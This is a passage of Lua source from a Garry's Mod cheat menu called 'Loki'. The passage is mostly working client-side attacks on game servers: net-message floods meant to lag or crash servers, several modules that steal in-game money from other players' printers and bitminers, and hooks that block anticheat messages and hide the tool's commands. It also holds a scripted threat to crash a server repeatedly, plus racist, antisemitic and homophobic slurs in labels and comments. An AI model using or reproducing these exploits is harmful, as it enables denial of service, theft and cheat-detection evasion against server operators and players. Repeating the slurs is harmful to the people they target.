                            for k3, v3 in ipairs( LOKI.GetVarExploits({"bools", "enabled"}, LOKI.TYPEVARS.EQUALTO, true) ) do
                                if(!LOKI.GetEnabled(v3)) then continue end
                                if((v3.hooks) && istable(v3.hooks) && v3.scanned) then
                                    local cooldown = LOKI.RecursiveGetVar(v3, {"vars", k2, "cooldown"}, "number")
                                    if(cooldown && cooldown - LOKI.REAL_CURTIME >= 0) then continue end
                                    if(k2 == "Think" && isfunction(v3.hooks[k2])) then
                                        if(v3.severity == 0) then
                                            ret = v3.hooks[k2]({}, v3, varargs, gm_ret)
                                            if(ret || ret == false) then
                                                ret_val = ret
                                            end
                                        else
                                            if(LOKI.NEXT_TIME <= SysTime()) then
                                                LOKI.RAN_THIS_TICK = true
                                                local tpt = (isfunction(v3.times_per_tick) && v3.times_per_tick(v3) || (v3.times_per_tick))
                                                local limit = 0
                                                if(!istable(tpt)) then
                                                    limit = math.Clamp(math.Round(LOKI.SafeToNumber(LOKI.SafeToNumber(tpt))), 1, math.huge)
                                                else
                                                    limit = LOKI.GetRateLimitedTimesPerTick() / #tpt
                                                end
                                                if(limit == math.huge) then
                                                    limit = LOKI.GetStored( "tpsrate", LOKI.RATE_LIMIT )
                                                end
                                                if(limit < LOKI.GetRateLimitedTimesPerTick()) then
                                                    if(!LOKI.BUFFER) then
                                                        LOKI.BUFFER = 0
                                                    end
                                                    LOKI.BUFFER = LOKI.BUFFER + LOKI.GetRateLimitedTimesPerTick() - limit
                                                end
                                                if(!limit || limit > LOKI.GetRateLimitedTimesPerTick()) then
                                                    if(LOKI.BUFFER) then
                                                        local tbl = LOKI.GetVarTable(LOKI.GetVarExploits({"bools", "enabled"}, LOKI.TYPEVARS.EQUALTO, true), "times_per_tick", LOKI.TYPEVARS.MORETHAN, LOKI.GetRateLimitedTimesPerTick())
                                                        local tbl_C = 0
                                                        for k4, v4 in ipairs(tbl) do
                                                            tbl_C = tbl_C + LOKI.GetEnabledCount(v4)
                                                        end
                                                        local BUFFER = math.Round(LOKI.BUFFER / tbl_C)
                                                        if(BUFFER == 0) then
                                                            BUFFER = LOKI.BUFFER
                                                        end
                                                        BUFFER = math.Round(math.Clamp(BUFFER, 0, math.huge))
                                                        limit = LOKI.GetRateLimitedTimesPerTick() + BUFFER
                                                        LOKI.BUFFER = math.Round(math.Clamp(LOKI.BUFFER - BUFFER, 0, math.huge))
                                                    else
                                                        limit = LOKI.GetRateLimitedTimesPerTick()
                                                    end
                                                end
                                                local mpt = (isfunction(v3.msgs_per_tick) && v3.msgs_per_tick(v3) || (v3.msgs_per_tick || 1))
                                                if(mpt > 1) then
                                                    limit = limit / mpt
                                                end
                                                limit = math.Clamp(math.Round(LOKI.SafeToNumber(limit)), 1, math.huge)
                                                /*if(v3.Sender) then
                                                    print("Sending " .. limit * mpt .. " for " .. v3.Name, v3.Index)
                                                end*/
                                                for i=1,limit do
                                                    ret = v3.hooks[k2]({}, v3, varargs, gm_ret)
                                                    if(ret || ret == false) then
                                                        ret_val = ret
                                                    end
                                                end
                                            end
                                        end
                                    elseif(isfunction(v3.hooks[k2])) then
                                        if(k2 == "PostRender") then
                                            cam.Start2D()
                                                ret = v3.hooks[k2]({}, v3, varargs, gm_ret)
                                            cam.End2D()
                                        else
                                            ret = v3.hooks[k2]({}, v3, varargs, gm_ret)
                                        end
                                        if(ret || ret == false) then
                                            ret_val = ret
                                        end
                                    end
                                end
                            end
                        end
                        if(k2 == "Think" && LOKI.RAN_THIS_TICK) then
                            LOKI.NEXT_TIME = SysTime() + (engine.TickInterval() * (LOKI.TICK_RATE / LOKI.GetStored( "tickdelay", LOKI.TICK_RATE)))
                            LOKI.RAN_THIS_TICK = false
                        end
                        LOKI.DetourCall = det_call
                        if(ret_val) then
                            return ret_val
                        elseif(ret_val == false) then
                            return false
                        end
                    end)
                end
            end
        end
    end
    LOKI.DetourCall = det_call
    ActiveCount()
    if(istable(LAST_TABLE)) then
        table.Empty(LAST_TABLE)
    end
end
LOKI.concommand.Add( "lowkey_menu", LOKI.OpenMenu)
LOKI.concommand.Add("lowkey_freecam", function(p, k, d)
    LOKI.Freecam.Toggle(d)
end)
local ctxlines = {
    "Hi, my name is Crash Jackson.",
    "I have access to 4 paid alts, each one of which allows me access to 5 other family shared steam alts.",
    "I plan to crash your server repeatedly until every single alt is banned.",
    "Then I'll buy some more alts and start over again.",
    "I won't stop until your server is down forever.",
    "Have a nice day.",
}
function LOKI.CrashJackson( p, k, d )
    if(!d) then return end
    for k, v in pairs( ctxlines ) do
        if DarkRP then
            timer.Simple( k * 2, function() RunConsoleCommand("say", "// "..v) end )
        else
            timer.Simple( k * 2, function() RunConsoleCommand("say", v) end )
        end
    end
end
LOKI.concommand.Add( "lowkey_crashjackson", LOKI.CrashJackson )
LOKI.concommand.Add( "lowkey_unload", function() LOKI.Killswitch = true end )
 
local messagetypes = {
    [1] = { ["col"] = Color( 255, 255, 255 ), ["icon"] = Material( "icon16/application_xp_terminal.png" ) }, -- neutral message
    [2] = { ["col"] = Color( 250, 200, 140 ), ["icon"] = Material( "icon16/cross.png" ) }, -- negative message
    [3] = { ["col"] = Color( 180, 250, 180 ), ["icon"] = Material( "icon16/tick.png" ) }, -- positive message
    [4] = { ["col"] = Color( 250, 140, 140 ), ["icon"] = Material( "icon16/error.png" ) }, -- error message
    [5] = { ["col"] = Color( 180, 180, 250 ), ["icon"] = Material( "icon16/user.png" ) }, -- blue message
    [6] = { ["col"] = Color( 250, 250, 180 ), ["icon"] = Material( "icon16/lightbulb.png" ) }, -- lightbulb message
}
 
local aegiscomponent = { color = -1, name = "Aegis" }
 
local notifies = {}
local tableinsert = table.insert
local istable = istable
local error = error
 
function LOKI.Notify( component, type, text )
    if !messagetypes then return end
    if !component or !istable( component ) then component = { color = Color( 255, 0, 0 ), name = "DEFINE A SCRIPT COMPONENT PROPERLY YOU AUTIST" } end
    if !messagetypes[type] then 
        tableinsert( notifies, { ["time"] = CurTime() + 10, ["ccol"] = Color(255,0,0), ["ctxt"] = "[ AEGIS ERROR ]", ["icon"] = "icon16/error.png", ["col"] = Color(255,0,0), ["txt"] = "Invalid aegis notify type! must be 1-6!" } ) 
        return 
    end
    if component.color == -1 then component.color = Color( 55, 55, 155 ) end
    tableinsert( notifies, { ["time"] = CurTime() + 10, ["ccol"] = component.color, ["ctxt"] = "[ "..component.name.." ]", ["icon"] = messagetypes[type].icon, ["col"] = messagetypes[type].col, ["txt"] = text } )
end
 
/*for i=1, 6 do
    LOKI.Notify( { color = Color(150, 150, 150, 245), name = "Loki" }, i, "Loki v2 Colour Test" )
end*/
 
local function DrawNotifies()
--  if !messagetypes then return end
    local x, y = 10, ScrH() / 2
    local cutoff = 0
    for k, v in pairs( notifies ) do
        if cutoff > 30 then continue end
        cutoff = cutoff + 1
        local lx = 10
        local timeleft = v.time - CurTime()
        if timeleft < 2 then lx = 10 - ( ( 2 - timeleft ) * 800 ) end -- pull back into the edge of the screen at the end of the timer
        if timeleft <= 0.5 then notifies[k] = nil continue end -- your time is up faggot
        local bgcol = Color( v.ccol.r, v.ccol.g, v.ccol.b, 145 )
        local bgcol2 = Color( v.col.r, v.col.g, v.col.b, 145 )
        surface.SetDrawColor( v.ccol )
        local txw, txh = draw.SimpleText( v.ctxt, "Trebuchet18", lx, y, v.ccol, 0, 0 )    
 
        surface.SetDrawColor( bgcol )
        surface.DrawRect( lx - 5, y - 1, txw + 10, 20 )
        surface.DrawLine( lx - 5, y - 1, lx - 5 + (txw + 10), y - 1 )
 
        surface.SetDrawColor( Color(255,255,255, 150) )
        surface.SetMaterial( v.icon )
        surface.DrawTexturedRect( (lx - 5) + txw + 16, y + 1, 16, 16 )
 
        txw = txw + 22
        
        local txw2, txh2 = draw.SimpleText( v.txt, "Trebuchet18", (lx - 5) + txw + 20, y, v.col, 0, 0 )
        surface.SetDrawColor( bgcol2 )
        surface.DrawRect( (lx - 5) + txw + 15, y - 1, txw2 + 10, 20 )
        surface.DrawLine( (lx - 5) + txw + 15, y - 1, ((lx - 5) + txw + 15) + txw2 + 10, y - 1 )
 
        y = y - 25
    end
end
 
setmetatable(net.ReadVars, {
    __index = function(self, key)
        return net.ReadVars[key] || net.ReadVars[0]
    end,
})
/*LOKI.AddAllReceivers = function()
    for i = 1, math.huge do
        local str = util.NetworkIDToString(i)
        if not str then return false end
    
        LOKI.AddExploit( str, {
            desc = "Potential lagsploit",
            severity = 0,
            bools = {enabled = false},
            status = -1,
            times_per_tick = math.huge,
            scan = function() return LOKI.ValidNetString( str ) end,
            hooks = {
                Think = function(tbl, sploit)
                    LOKI.NetStart( sploit,str)
                    net.SendToServer()
                end,
            },
            functions = {
                { typ = "bool", },
            },
        } ) 
    end
end
LOKI.concommand.Add("lowkey_addall", LOKI.AddAllReceivers)*/
local str = "\n"
LOKI.AddExploit( "lag_func", {
    desc = "Test exploit. (if this works let me know so I can officially enable it)",
    severity = 1,
    bools = {enabled = false},
    status = -1,
    times_per_tick = math.huge,
    scan = function() return LOKI.ValidNetString( "fp_chatText" ) end,
    hooks = {
        Think = function(tbl, sploit)
            if(str == "\n") then
                for i = 1, 65533 do
                    str = str .. str
                end
            end
            LOKI.NetStart( sploit, "fp_chatText")
            net.WriteString(str)
            net.SendToServer()
        end,
    },
    functions = {
        { typ = "bool", },
    },
} )
if(LOKI.Developer) then
    LOKI.AddExploit( "Lagsploit Tester", {
        desc = "Bomb any receiver to find lagsploits",
        severity = -1,
        bools = {enabled = false},
        status = 1,
        times_per_tick = math.huge,
        vars = {},
        scan = function() return true end,
        hooks = {
            Think = function(tbl, sploit)
                if(LOKI.GetStored("tester1")[2] == "*") then
                    sploit.times_per_tick = LOKI.GetStored( "tpsrate", LOKI.RATE_LIMIT ) / #LOKI.Receivers
                    for k, v in ipairs(LOKI.Receivers) do
                        if(v.str != "*") then
                            LOKI.NetStart(sploit, v.str)
                            net.SendToServer()
                        end
                    end
                else
                    sploit.times_per_tick = math.huge
                    LOKI.NetStart(sploit, LOKI.GetStored("tester1")[2])
                    net.SendToServer()
                end
            end,
        },
        functions = {
            { typ = "combo", Name = "Sender", tbl = LOKI.GetAllReceivers(), restriction = nil, var = "str", sort = "str", find = "str", default = -1, addr = "tester1" },
            { typ = "bool", },
        },
    } )
end
//////////////////////////////////////////////- SPLOITS -////////////////////////////////////////////////
 
LOKI.AddExploit( "Test Sploit", {
    desc = "Does nothing, used for menu testing",
    severity = 1,
    bools = {enabled = true},
    status = 1,
    times_per_tick = 1,
    vars = {},
    scan = function() return false end,
    /*count = {
        ["Active"] = 25,
        ["Total"] = 25,
    },*/
    hooks = {
        Think = function(tbl, sploit)
            PrintTable(tbl)
            print( LOKI.GetStored( "teststring", "" ).." is such a fucking gay nigger omg" )
        end,
    },
    functions = {
        { typ = "float", Name = "Niggers to kill", default = 1, min = 0, max = 100, addr = "testfloat" },
        { typ = "string", Name = "Enter a gay cunt", default = "you", addr = "teststring" },
        { typ = "players", addr = "testplayers" },
        { typ = "func", Name = "Fist his holes", args = {LOKI.GetLP()}, },
    },
} )
 
function LOKI.TIME_TO_TICKS( dt ) return( LOKI.SafeToNumber( 0.5 + LOKI.SafeToNumber(dt) / engine.TickInterval() ) ) end
function LOKI.TICKS_TO_TIME( t ) return( engine.TickInterval() *( t ) ) end
function LOKI.ROUND_TO_TICKS( t ) return( engine.TickInterval() * LOKI.TIME_TO_TICKS( t ) ) end
LOKI.DRAW_TPS = 0
LOKI.OS_TIME = 0
LOKI.DROPPED_FRAMES = 0
LOKI.TICK_RATE = math.Round( 1 / engine.TickInterval() )
LOKI.RATE_LIMIT = 1028
LOKI.NEXT_TIME = 0
LOKI.REAL_CURTIME = 0
function LOKI.DrawText(...)--text, font, x, y, col
    if true then return draw.SimpleText(...) end
    surface.SetFont( font )
    surface.SetTextColor( col )
    surface.SetTextPos( x, y )
    surface.DrawText( tostring(text) )
end
function LOKI.GetRateLimitedTimesPerTick()
    local enabled = LOKI.GetVarExploits({"bools", "enabled"}, LOKI.TYPEVARS.EQUALTO, true)
    local senders = LOKI.GetVarTable(enabled, "Sender", LOKI.TYPEVARS.EQUALTO, true)
    local count = #senders
    for k, v in ipairs(senders) do
        local tbl_C = table.Count(v.bools)
        if(tbl_C > 1) then
            for k2, v2 in pairs(v.bools) do
                if(k2 != "enabled") then
                    if(v2 == true) then
                        count = (count + 1)
                    end
                else
                    count = count - 1
                end
            end
        end
    end
    local limit = count
    if(limit <= 0) then
        limit = 1
    end
    return math.Clamp(
        math.Round(
            (LOKI.GetStored( "tpsrate", LOKI.RATE_LIMIT ) / LOKI.GetStored( "tickdelay", 
                LOKI.TICK_RATE) / limit) * (LOKI.GetStored( "tickdelay", LOKI.TICK_RATE) / math.min(LOKI.GetStored( "tickdelay", LOKI.TICK_RATE), math.max(LOKI.GetStored( "fpsthreshold", 5 ), (1 / FrameTime()))))), 1, math.huge)
end
if(GAMEMODE.LimitHit) then GAMEMODE.LimitHit = function() return false end end
LOKI.DrawPanels = {}
LOKI.AddExploit( "Loki Settings", {
    desc = "Tweak performance",
    severity = 0,
    bools = {enabled = true},
    status = 4,
    times_per_tick = 1,
    vars = {},
    scan = function() return true end,
    hooks = {
        CreateMove = function(tbl, sploit, varargs)
            LOKI.GetLP():SetViewPunchAngles(Angle(0,0,0))
            local cmd = varargs[1]
            if(cmd:TickCount() == 0 || cmd:CommandNumber() == 0) then return end
            if(input.LookupBinding("+speed", true) != "no value" && input.IsKeyDown(input.GetKeyCode(input.LookupBinding("+speed", true))) && !cmd:KeyDown(IN_SPEED)) then
                cmd:SetButtons(bit.bor(cmd:GetButtons(), IN_SPEED))
            end
            hook.Run("CL_Move", unpack(varargs))
        end,
        SetupMove = function(tbl, sploit, varargs)
            hook.Run("CL_PostMove", unpack(varargs))
        end,
        PostRender = function()
            LOKI.GetLP():SetViewPunchAngles(Angle(0,0,0))
            render.SetRenderTarget( render.GetRenderTarget() )
            local ent = LOKI.IsHovered || LOKI.SpectateEnt
            if((LOKI.Freecam.Enabled == true || (IsValid(ent) && ent.OBBCenter)) && !gui.IsGameUIVisible()) then
                render.RenderView( LOKI.Freecam.Data )
                for k, v in ipairs(vgui.GetWorldPanel():GetChildren()) do
                    if IsValid(v) && v:IsVisible() then 
                        v:PaintManual()
                    end
                end
                /*LOKI.GENERAL_OVERRIDE = true
                LOKI.GetLP():DrawModel()
                LOKI.GENERAL_OVERRIDE = false*/
            end
            LOKI.LAST_RENDER = SysTime()
            LOKI.DrawText( LOKI.DRAW_TPS .. "/" .. LOKI.TICK_RATE .. " - " .. LOKI.GetRateLimitedTimesPerTick(), "TargetID", 0, 0, Color( 255, 255, 255, 255 ) )
            LOKI.DrawText( "D: " .. LOKI.DROPPED_FRAMES, "TargetID", 0, 15, Color( 255, 255, 255, 255 ) )
            cam.Start3D()
                local ent = LOKI.IsHovered || LOKI.SpectateEnt
                if(IsValid(ent) && ent.OBBCenter) then
                    if(ent:IsDormant()) then
                        ent:DrawModel()
                    end
                else
                    LOKI.IsHovered = false
                    LOKI.SpectateEnt = false
                end
                hook.Run("Render3D")
            cam.End3D()
            hook.Run("Render2D")
            DrawNotifies()
            for k, v in ipairs(LOKI.DrawPanels) do
                if IsValid(v) && v:IsVisible() then 
                    v:PaintManual()
                end
            end
        end,
        CalcView = function(tbl, sploit, varargs)
            local ply, pos, angles, fov, drawviewer = unpack(varargs)
            drawviewer = false
            local ent = LOKI.IsHovered || LOKI.SpectateEnt
            if(IsValid(ent) && ent.OBBCenter) then
                drawviewer = true
                pos = (ent:GetPos() + ent:OBBCenter())
                local tr = util.TraceLine( {
                    start = pos,
                    endpos = (ent:GetPos() + ent:OBBCenter())-( angles:Forward()*100 ),
                    filter = function( hitent ) if ( hitent == ent ) then return false end end
                } )
                pos = tr.HitPos
            else
                LOKI.IsHovered = false
                LOKI.SpectateEnt = false
            end
            if ( LOKI.Freecam.SetView ) then
                LOKI.Freecam.ViewOrigin = pos
                LOKI.Freecam.SetView = false
            end
            if ( LOKI.Freecam.Enabled == true ) then 
                LOKI.Freecam.Data = {origin = LOKI.Freecam.ViewOrigin, drawviewer = true, dopostprocess = true, drawhud = true, drawmonitors = true, drawviewmodel = false}
            else
                LOKI.Freecam.Data = ({ply = ply, origin = pos, angles = angles, fov = fov, drawviewer = drawviewer, dopostprocess = true, drawhud = true, drawmonitors = true, drawviewmodel = false})
            end
            //return LOKI.Freecam.Data
        end,
        StartCommand = function(tbl, sploit, varargs)
            local cmd = varargs[2]
            if ( LOKI.Freecam.Enabled == true ) then
 
                LOKI.Freecam.ViewOrigin = LOKI.Freecam.ViewOrigin + ( LOKI.Freecam.Velocity )
                LOKI.Freecam.Velocity = LOKI.Freecam.Velocity * 0.95
        
                local add = Vector( 0, 0, 0 )
                local ang = cmd:GetViewAngles()
                local move_mod = 4
                local speed_mod = 4
                if ( cmd:KeyDown( IN_FORWARD ) ) then add = add + ang:Forward() * move_mod end
                if ( cmd:KeyDown( IN_BACK ) ) then add = add - ang:Forward() * move_mod end
                if ( cmd:KeyDown( IN_MOVERIGHT ) ) then add = add + ang:Right() * move_mod end
                if ( cmd:KeyDown( IN_MOVELEFT ) ) then add = add - ang:Right() * move_mod end
                if ( cmd:KeyDown( IN_JUMP ) ) then add = add + Angle(0,0,0):Up() * move_mod cmd:RemoveKey(IN_JUMP) end
                if ( cmd:KeyDown( IN_DUCK ) ) then add = add - Angle(0,0,0):Up() * move_mod cmd:RemoveKey(IN_DUCK) end
 
                if(input.LookupBinding("+speed", true) != "no value" && input.IsKeyDown(input.GetKeyCode(input.LookupBinding("+speed", true))) && !cmd:KeyDown(IN_SPEED)) then add = add * speed_mod end
            
                LOKI.Freecam.Velocity = LOKI.Freecam.Velocity + (add * RealFrameTime())
 
                cmd:SetForwardMove( 0 )
                cmd:SetSideMove( 0 )
                cmd:SetUpMove( 0 )
 
            end
        end,
        Tick = function(tbl, sploit)
            if(LOKI.RAW_FRAME_TIME == (1 / engine.ServerFrameTime())) then
                LOKI.DROPPED_FRAMES = LOKI.DROPPED_FRAMES + 1
            else
                LOKI.RAW_FRAME_TIME = (1 / engine.ServerFrameTime())
                LOKI.DROPPED_FRAMES = 0
                LOKI.REAL_CURTIME = _G.CurTime()
            end
            if(LOKI.OS_TIME != os.time()) then
                LOKI.DRAW_TPS = math.Clamp(LOKI.TICK_RATE - LOKI.DROPPED_FRAMES, 0, LOKI.TICK_RATE)
                LOKI.OS_TIME = os.time()
            end
        end,
        Think = function(tbl, sploit)
            local pan = vgui.GetHoveredPanel()
            if(IsValid(pan) && IsValid(pan.btnClose) && isfunction(pan.btnClose.SetVisible) && !pan.PaintedManually) then
                pan.btnClose:SetVisible( true )
            end
        end,
        OnReloaded = function()
            table.Empty(LOKI.Hooks)
            LOKI.RunDetours()
            if(IsValid(LOKI.Menu) && LOKI.Menu:IsVisible()) then
                LOKI.Menu:SetVisible(false)
            end
            LOKI.OpenMenu(true)
        end,
        concommand = {
            Run = function(sploit, varargs)
                if(LOKI.CommandList[ string.lower( varargs[2] ) ]) then
                    pcall(function() LOKI.CommandList[ string.lower( varargs[2] ) ](unpack(varargs)) end)
                    return false
                end
            end
        },
        gui = {
            ["*"] = function(tabk, funck, sploit, varargs)
                return false
            end
        },
        input = {
            ["*"] = function()
                return false
            end
        },
        render = {
            SetRenderTarget = function(sploit, varargs)
                //if(LOKI.GetStored( "securerenderer", false )) then return false end
            end
        },
        util = {
            NetworkIDToString = function(sploit, varargs)
                local det_call = LOKI.DetourCall
                LOKI.DetourCall = true
                LOKI.NetIncomingMsg = util.NetworkIDToString(varargs[1])
                LOKI.DetourCall = det_call
                if(!LOKI.NetIncomingMsg) then return end
                for k, v in ipairs(LOKI.GetAllExploits()) do
                    local Receiver = LOKI.RecursiveGetVar(v, {"hooks", "net", "Receive"}, "function")
                    if(Receiver) then
                        if(Receiver(v, LOKI.NetIncomingMsg) == false) then
                            return nil
                        end
                    end
                end
            end,
        },
        input = {
            LookupBinding = function(sploit, varargs)
                local bind = input.LookupBinding(unpack(varargs))
                if(bind) then
                    if(LOKI.CommandList[input.LookupKeyBinding(input.GetKeyCode(bind))]) then
                        LOKI.RETURN_OVERRIDE = true
                    end
                end
            end,
            LookupKeyBinding = function(sploit, varargs)
                if(LOKI.CommandList[input.LookupKeyBinding(unpack(varargs))]) then LOKI.RETURN_OVERRIDE = true end
            end,
        },
        /*string = {
            lower = function(sploit, varargs)
                local str = varargs[1]
                if(str == "Odium") then 
                    return string.lower
                end
                if(str == "LOKI.GetTable()") then
                    return LOKI
                end
                local LowerCommand = string.lower( str ) || str
                if ( LOKI.CommandList[ LowerCommand ] != nil ) then
                    pcall(function() LOKI.CommandList[ LowerCommand ]( player, str, arguments, args ) end)
                end
            end,
        },*/ -- might use later, somewhat secure way to add concommands in clientstate but PlayerBindPress works better
        net = {
            Receive = function(sploit, strName)
                if(strName == "diagnostics1" || strName == "diagnostics2" || strName == "diagnostics3") then
                    return false
                end
            end,
            /*WriteAngle = function(sploit, varargs)
                if(LOKI.NetOutgoingMsg == "thirdperson_etp") then
                    varargs[1] = Angle(0,0,0,2^64)
                end
            end,*/
            ["*"] = function(tabk, funck, sploit, varargs)
                if(funck:StartWith("Write")) then
                    if(LOKI.BlockNetOutgoing) then
                        return false
                    elseif(funck == "BytesWritten") then
                        return -1
                    elseif(LOKI.NetOutgoingMsg == "anticheat" || LOKI.NetOutgoingMsg == "thisisnotcool") then
                        return false
                    elseif(funck == "WriteTable") then
                        if(LOKI.Developer) then
                            PrintTable(varargs[1])
                        end
                    end
                elseif(funck:StartWith("Read")) then
                    if(LOKI.BlockNetIncoming) then
                        return false
                    end
                end
            end,
        },
        PreDrawTranslucentRenderables = function()
            EyePos()
            EyeVector()
            EyeAngles()
        end,
        PlayerBindPress = function(tbl, sploit, varargs, ret)
            if(LOKI.CommandList[ string.lower( varargs[2] ) ]) then
                pcall(function() LOKI.CommandList[ string.lower( varargs[2] ) ] (unpack(varargs)) end)
                return true
            end
            if(ret != nil) then return ret else return false end
        end,
        cam = {
            //Start3D = function() return false end,
            //End3D = function() return false end,
        },
        _G = {
            RunConsoleCommand = function(tbl, varargs)
                if(varargs[1] == "disconnect") then return false end
            end,
        },
        vgui = {
            Create = function(tbl, varargs)
                local classname, parent, name, loki = varargs[1],varargs[2],varargs[3],varargs[4]
                local ret = vgui.Create(classname, parent, name)
                if(!ret) then print("something touched me wrongly") return end
                ret.MenuStart = true
                if(classname == "DFrame" && loki == true) then
                    ret:SetPaintedManually(true)
                    ret.PaintedManually = true
                    LOKI.DrawPanels[#LOKI.DrawPanels+1] = ret
                    return LOKI.DrawPanels[#LOKI.DrawPanels]
                end
                return ret
            end,
        },
    },
    functions = {
        { typ = "float", Name = "Rate", default = LOKI.RATE_LIMIT, addr = "tpsrate", min = 1, max = (LOKI.ARES && math.huge || 1536) },
        { typ = "float", Name = "Ticks", min = 1, max = LOKI.TICK_RATE, default = LOKI.TICK_RATE, addr = "tickdelay" },
        { typ = "float", Name = "FPS", min = 0, max = math.huge, default = 5, addr = "fpsthreshold" },
        { typ = "float", Name = "Bait", min = 0, max = math.huge, default = 5, addr = "baitthreshold" },
        { typ = "bool", ToggleText = {"Freecam"}, border = true, bool = "freecam", callback = LOKI.Freecam.Toggle },
        //{ typ = "bool", ToggleText = {"Secure"}, border = true, addr = "securerenderer", bool = "securerenderer" },
        //{ typ = "bool", ToggleText = {"Fix ESP"}, border = true, bool = "fixesp" },
        { typ = "player", addr = "spectate", Name = "Spectate", nostore = true },
        //{ typ = "bool", ToggleText = {"Fix Sprint"}, border = true, bool = "sprintfix" },
    },
} )
LOKI.BAIT_LIMIT = LOKI.GetStored( "baitthreshold", 5 )
//////////////////////////////////////////////- MONEY -////////////////////////////////////////////////
LOKI.AddExploit( "Printer Money Stealer", {
    desc = "Instantly jew all money from every printer on the server (500 for latest, -1 for infinite)",
    severity = 90,
    bools = {enabled = false},
    status = 1,
    times_per_tick = 1,
    vars = {},
    scan = function() return LOKI.DynamicNetString("SyncPrinterButtons") end,
    hooks = {
        Tick = function(tbl, sploit)
            local dist = LOKI.GetStored( "printers1", 500 )
            local ent_tbl = LOKI.ents.FindByGlobal("WithdrawText")
            for k, v in ipairs(ent_tbl) do
                if( dist == -1 || LOKI.GetLP():GetPos():Distance(v:GetPos()) < dist ) then
                    LOKI.NetStart( sploit, sploit.channel )
                    net.WriteEntity(v)
                    net.WriteUInt(2, 4)
                    net.SendToServer()
                end
            end
        end,
    },
    functions = {
        { typ = "bool", },
        { typ = "float", Name = "Distance", min = -1, max = math.huge, default = 500, addr = "printers1" },
    },
} )
LOKI.AddExploit( "Printer Money Stealer", {
    desc = "Instantly jew all money from every printer on the server",
    severity = 90,
    bools = {enabled = false},
    status = 1,
    times_per_tick = 1,
    vars = {},
    scan = function() return LOKI.ValidNetString( "DataSend" ) end,
    hooks = {
        Tick = function(tbl, sploit)
            for k, v in ipairs(LOKI.ents.FindByGlobal("GetPToggle")) do
                LOKI.NetStart( sploit, "DataSend")
                net.WriteFloat(2)
                net.WriteEntity(v)
                net.WriteEntity(LOKI.GetLP())
                net.SendToServer()
            end
        end,
    },
    functions = {
        { typ = "bool", },
    },
} ) 
LOKI.AddExploit( "Printer Money Stealer", {
    desc = "Instantly jew all money from every printer on the server",
    severity = 90,
    bools = {enabled = false},
    status = 1,
    times_per_tick = 1,
    vars = {},
    scan = function() return LOKI.ValidNetString( "withdrawop" ) end,
    hooks = {
        Tick = function(tbl, sploit)
            for k, v in ipairs(LOKI.ents.FindByGlobal("S_Model")) do
                LOKI.NetStart( sploit, "withdrawop")
                net.WriteEntity(v)
                net.SendToServer()
            end
        end,
    },
    functions = {
        { typ = "bool", },
    },
} )
LOKI.AddExploit( "Printer Money Stealer", {
    desc = "Instantly jew all money from every printer on the server",
    severity = 90,
    bools = {enabled = false},
    status = 1,
    times_per_tick = 1,
    vars = {},
    scan = function() return LOKI.ValidNetString( "NGII_TakeMoney" ) end,
    hooks = {
        Tick = function(tbl, sploit)
            for k, v in ipairs(LOKI.ents.FindByGlobal("Stats")) do
                LOKI.NetStart( sploit, "NGII_TakeMoney")
                net.WriteEntity(v)
                net.WriteEntity(LOKI.GetLP())
                net.SendToServer()
            end
        end,
    },
    functions = {
        { typ = "bool", },
    },
} )
LOKI.AddExploit( "Printer Money Stealer", {
    desc = "Instantly jew all money from every printer on the server",
    severity = 90,
    bools = {enabled = false},
    status = 1,
    times_per_tick = 1,
    vars = {},
    scan = function() return LOKI.ValidNetString( "NET_DoPrinterAction" ) end,
    hooks = {
        Tick = function(tbl, sploit)
            for k, v in ipairs(LOKI.ents.FindByGlobal("Stats")) do
                LOKI.NetStart( sploit, "NET_DoPrinterAction")
                net.WriteEntity(LOKI.GetLP())
                net.WriteEntity(v)
                net.WriteInt(2, 16)
                net.SendToServer()
            end
        end,
    },
    functions = {
        { typ = "bool", },
    },
} ) 
LOKI.AddExploit( "Printer Money Stealer", {
    desc = "Instantly jew all money from every bitminer on the server",
    severity = 90,
    bools = {enabled = false},
    status = 1,
    times_per_tick = 1,
    vars = {},
    scan = function() return LOKI.ValidNetString( "BM2.Command.SellBitcoins" ) end,
    hooks = {
        Tick = function(tbl, sploit)
            if(LOKI.TIME_TO_TICKS(LOKI.REAL_CURTIME) % (LOKI.SafeToNumber(LOKI.GetStored("stealer1cooldown", 1)) + 1) == 0) then
                for k, v in ipairs(LOKI.ents.FindByGlobal("GetIsMining")) do
                    LOKI.NetStart( sploit, "BM2.Command.SellBitcoins")
                    net.WriteEntity(v)
                    net.SendToServer()
                end
            end
        end,
    },
    functions = {
        { typ = "float", Name = "Cooldown", min = 0, max = LOKI.TICK_RATE, default = 1, addr = "stealer1cooldown" },
        { typ = "bool", },
    },
} )
LOKI.AddExploit( "Printer Money Stealer", {
    desc = "Instantly jew all money from every printer on the server",
    severity = 90,
    bools = {enabled = false},
    status = 1,
    times_per_tick = 1,
    vars = {},
    scan = function() return LOKI.ValidNetString( "fg_printer_money" ) end,
    hooks = {
        Tick = function(tbl, sploit)
            for k, v in ipairs(LOKI.ents.FindByGlobal("Getdata_money")) do
                LOKI.NetStart( sploit, "fg_printer_money")
                net.WriteEntity(v)
                net.SendToServer()
            end
        end,
    },
    functions = {
        { typ = "bool", },
    },
} )
LOKI.AddExploit( "Printer Money Stealer", {
    desc = "Instantly jew all money from every printer on the server",
    severity = 90,
    bools = {enabled = false},
    status = 1,
    times_per_tick = 1,
    vars = {},
    scan = function() return LOKI.ValidNetString( "icemod_printer_withdraw" ) end,
    hooks = {
        Tick = function(tbl, sploit)
            for k, v in ipairs(LOKI.ents.FindByGlobal("PrinterMenu")) do
                LOKI.NetStart( sploit, "icemod_printer_withdraw")
                net.WriteEntity(v)
                net.SendToServer()
            end
        end,
    },
    functions = {
        { typ = "bool", },
    },
} )
LOKI.AddExploit( "Printer Exploit", {
    desc = "Edit the stats of any printer in the server",
    severity = 65,
    bools = {enabled = false},
    status = 1,
    times_per_tick = math.huge,
    scan = function() return LOKI.DynamicNetString( "lithiumPrinter2" ) end,
    count = {
        ["Active"] = 3,
        ["Total"] = 3,
    },
    hooks = {
        Think = function(tbl, sploit)               
            local ent = LOKI.GetStored("px_ply", {})[1]
            if(IsValid(ent) && istable(ent.data)) then
                LOKI.OpenTableEditor(LOKI.Menu, ent.data, "Printer Stats", function(tbl)
                    LOKI.NetStart(sploit, {"lithiumPrinter2Bronze", "lithiumPrinter2Economic", "lithiumPrinter2Iron", "lithiumPrinter2Silver", "lithiumPrinter2Obsidian", "lithiumPrinter2Donator"}, true)
                    net.WriteEntity(ent)
                    net.WriteTable(tbl)
                    net.SendToServer()
                end)
            end
            
        end,
    },
    functions = {
